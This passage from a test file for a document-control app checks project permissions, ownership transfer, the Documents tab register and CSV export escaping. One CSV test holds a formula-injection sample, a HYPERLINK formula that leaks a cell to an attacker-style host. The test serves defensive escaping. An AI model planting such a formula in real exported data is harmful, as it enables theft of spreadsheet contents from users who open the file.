      { org_id: "o1", uid: "mgr-dc", status: "active", role: "Manager", roles: ["Manager", "DocCtrl"] },
      { org_id: "o1", uid: "eng-dc", status: "active", role: "Engineer", roles: ["Engineer", "DocCtrl"] },
      { org_id: "o1", uid: "mgr", status: "active", role: "Manager", roles: ["Manager"] },
      { org_id: "o1", uid: "someone", status: "suspended", role: "Engineer", roles: ["Engineer"] },
    ];
    await expect(assertCanManageProject("p1", "mgr-dc")).resolves.toMatchObject({ id: "p1", orgId: "o1", status: "active" });
    await expect(assertCanManageProject("p1", "eng-dc")).resolves.toMatchObject({ id: "p1" });
    await expect(assertCanManageProject("p1", "mgr")).rejects.toThrow(/Only the project owner or an admin/);
    await expect(assertCanManageProject("p1", "someone")).rejects.toThrow(/Only an active member/);
  });
});

// ── SEC-15 ───────────────────────────────────────────────────────────────────

describe("SEC-15 — ownership moves through transfer_project_ownership", () => {
  it("a plain owner's transfer is ONE RPC; the new owner is told", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    await transferOwnership({ projectId: "p1", newOwnerUserId: "u2", newOwnerName: "u2", actorUserId: "own", actorEmail: "own@x.io" });
    expect(state.rpc).toEqual([{ fn: "transfer_project_ownership", args: { p_project: "p1", p_new_owner: "u2", p_new_owner_name: "u2" } }]);
    expect(writesTo("projects")).toHaveLength(0);
    expect(state.notifies[0]).toMatchObject({ userId: "u2", title: "You're now the project owner" });
  });

  it("the database's refusal of a deactivated recipient reaches the user in words", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.rpcResults.transfer_project_ownership = { data: null, error: { message: "The new owner must be an active member of this workspace.", code: "23514" } };
    await expect(transferOwnership({ projectId: "p1", newOwnerUserId: "gone", actorUserId: "own" })).rejects.toThrow("The new owner must be an active member of this workspace.");
    expect(state.notifies).toHaveLength(0);
  });

  it("before 20261102: a deactivated recipient is refused; a plain owner filtered by RLS is told why, not the raw RLS text", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.rpcResults.transfer_project_ownership = { data: null, error: MISSING_FN };
    await expect(transferOwnership({ projectId: "p1", newOwnerUserId: "gone", actorUserId: "own" })).rejects.toThrow(/must be an active member/);
    state.rows.org_members = [OWNER, { org_id: "o1", uid: "u2", status: "active", role: "Engineer" }];
    state.queue["projects.update"] = [{ data: [] }]; // the WITH CHECK filtered it
    await expect(transferOwnership({ projectId: "p1", newOwnerUserId: "u2", actorUserId: "own" })).rejects.toThrow(/until database migration 20261102/);
  });
});

// ── UX-11 ────────────────────────────────────────────────────────────────────

describe("UX-11 — the register the Documents tab shows, and its badge", () => {
  it("lists linked documents, APPROVED intake documents, marks the not-current, and counts what permissions hide", async () => {
    state.rows.project_documents = [
      { id: "l1", project_id: "p1", document_id: "d1", source: "checkout", last_seen_at: "2026-09-02" },
      { id: "l2", project_id: "p1", document_id: "d2", source: "manual", last_seen_at: "2026-09-01" },
      { id: "l3", project_id: "p1", document_id: "d-hidden", source: "manual", last_seen_at: "2026-08-01" },
    ];
    state.rows.projects = [{ id: "p1", org_id: "o1", intake_collection_id: "col-intake" }];
    state.queue["documents.select"] = [
      { data: [
        { id: "d1", document_number: "ISO-100", rev: "C", status: "Issued", library_id: "lib" },
        { id: "d2", document_number: "ISO-101", rev: "B", status: "Superseded", library_id: "lib" },
      ] },
      { data: [{ id: "d9", document_number: "ISO-900", rev: "A", status: "Issued", library_id: "lib-intake" }] },
    ];
    const reg = await listProjectDocuments("p1");
    expect(reg.hiddenByPermissions).toBe(1);
    expect(reg.rows.map((r) => [r.docId, r.source, r.isCurrent])).toEqual([
      ["d1", "checkout", true], ["d2", "manual", false], ["d9", "intake", true],
    ]);
    // The intake read asks only for documents that carry a current version (approved).
    const intakeRead = state.calls.filter((c) => c.table === "documents" && c.method === "not");
    expect(intakeRead.map((c) => c.args)).toEqual([["current_version_id", "is", null]]);
    // Badge: distinct documents — ten checkout sessions of one drawing count once.
    expect(documentsTabCount(reg, ["d1", "d1", "d1", "d1", "d1", "d1", "d1", "d1", "d1", "d1"])).toBe(4);
    expect(documentsTabCount(null, ["d1", "d1", "d7"])).toBe(2);
  });

  it("a restricted document that is ALSO checked out under the project counts once — the badge matches the tab", async () => {
    state.rows.project_documents = [
      { id: "l1", project_id: "p1", document_id: "d1", source: "checkout", last_seen_at: "2026-09-02" },
      // the checkout auto-linked it; the viewer's ACL hides it
      { id: "l2", project_id: "p1", document_id: "d-secret", source: "checkout", last_seen_at: "2026-09-01" },
    ];
    state.rows.projects = [{ id: "p1", org_id: "o1", intake_collection_id: null }];
    state.queue["documents.select"] = [{ data: [{ id: "d1", document_number: "ISO-100", rev: "C", status: "Issued", library_id: "lib" }] }];
    const reg = await listProjectDocuments("p1");
    expect(reg.hiddenByPermissions).toBe(1);
    expect(reg.hiddenDocIds).toEqual(["d-secret"]);
    // checkout_sessions (org-readable) still supplies the hidden document's id: one visible row + one hidden notice = 2, not 3
    expect(documentsTabCount(reg, ["d1", "d-secret"])).toBe(2);
  });

  it("a failed project read throws — it no longer reads as 'no intake collection' and drops the approved sheets silently", async () => {
    state.rows.project_documents = [];
    state.errors["projects.select"] = { message: "canceling statement due to statement timeout", code: "57014" };
    await expect(listProjectDocuments("p1")).rejects.toThrow(/^The project could not be read, so its approved intake documents cannot be listed: canceling statement/);
    // Before 20260902 the column does not exist: then there is simply no intake collection.
    state.errors["projects.select"] = { message: 'column projects.intake_collection_id does not exist', code: "42703" };
    state.rows.project_documents = [{ id: "l1", project_id: "p1", document_id: "d1", source: "manual", last_seen_at: "2026-09-02" }];
    state.rows.documents = [{ id: "d1", document_number: "ISO-100", rev: "C", status: "Issued", library_id: "lib" }];
    await expect(listProjectDocuments("p1")).resolves.toMatchObject({ rows: [{ docId: "d1", source: "manual" }], hiddenByPermissions: 0 });
    // A missing column that is NOT the intake column is a failure like any other.
    state.errors["projects.select"] = { message: 'column projects.org_id does not exist', code: "42703" };
    await expect(listProjectDocuments("p1")).rejects.toThrow(/could not be read/);
  });

  it("approved intake past 200 — and past PostgREST's 1,000-row cap — is listed in full, and the badge counts every sheet", async () => {
    state.rows.projects = [{ id: "p1", org_id: "o1", intake_collection_id: "col-intake" }];
    state.rows.project_documents = [];
    state.rows.documents = Array.from({ length: 1005 }, (_, i) => ({
      id: `in${i}`, org_id: "o1", collection_id: "col-intake", current_version_id: `v${i}`,
      document_number: `SUB-${i}`, rev: "A", status: "Issued", library_id: "lib-intake",
    }));
    const reg = await listProjectDocuments("p1");
    expect(reg.rows).toHaveLength(1005);
    expect(reg.rows.every((r) => r.source === "intake")).toBe(true);
    expect(documentsTabCount(reg, [])).toBe(1005);
    const ranges = state.calls.filter((c) => c.table === "documents" && c.method === "range").map((c) => c.args);
    expect(ranges).toEqual([[0, 999], [1000, 1999]]);
    expect(state.calls.filter((c) => c.table === "documents" && c.method === "limit")).toEqual([]);
  });

  it("a register of 1,200 links is read in full (paged) and its documents 100 ids per request — no silent cap, no oversized filter", async () => {
    state.rows.projects = [{ id: "p1", org_id: "o1", intake_collection_id: null }];
    state.rows.project_documents = Array.from({ length: 1200 }, (_, i) => ({
      id: `l${i}`, project_id: "p1", document_id: `d${i}`, source: "checkout", last_seen_at: "2026-09-01",
    }));
    state.rows.documents = Array.from({ length: 1200 }, (_, i) => ({ id: `d${i}`, document_number: `ISO-${i}`, rev: "A", status: "Issued", library_id: "lib" }));
    const reg = await listProjectDocuments("p1");
    expect(reg.rows).toHaveLength(1200);
    expect(reg.hiddenByPermissions).toBe(0);
    const linkRanges = state.calls.filter((c) => c.table === "project_documents" && c.method === "range").map((c) => c.args);
    expect(linkRanges).toEqual([[0, 999], [1000, 1999]]);
    const inSizes = state.calls.filter((c) => c.table === "documents" && c.method === "in").map((c) => (c.args[1] as string[]).length);
    expect(inSizes).toEqual(Array(12).fill(100));
    // A failed page is a failure, never a short register.
    state.queue["project_documents.select"] = [{ error: { message: "timeout" } }];
    await expect(listProjectDocuments("p1")).rejects.toThrow(/^The project's document register could not be read: timeout/);
  });
});

// ── PM-10 ────────────────────────────────────────────────────────────────────

describe("PM-10 — CSV cells are never live formulas", () => {
  it("a project named =1+1 round-trips as an inert text cell", () => {
    expect(csvCell("=1+1")).toBe(`"'=1+1"`);
    expect(csvCell(`=HYPERLINK("https://evil.example/?d="&A2,"Open budget")`)).toBe(`"'=HYPERLINK(""https://evil.example/?d=""&A2,""Open budget"")"`);
    for (const lead of ["=", "+", "-", "@", "\t", "\r"]) expect(isFormulaLike(`${lead}cmd`)).toBe(true);
    expect(csvCell("-12.5")).toBe(`"'-12.5"`);
  });

  it("ordinary values keep the existing escaping", () => {
    expect(csvCell("Pump swap")).toBe("Pump swap");
    expect(csvCell('He said "go", then left')).toBe('"He said ""go"", then left"');
    expect(csvCell(null)).toBe("");
    expect(csvLine(["a", "=b", 3])).toBe(`a,"'=b",3`);
  });
});
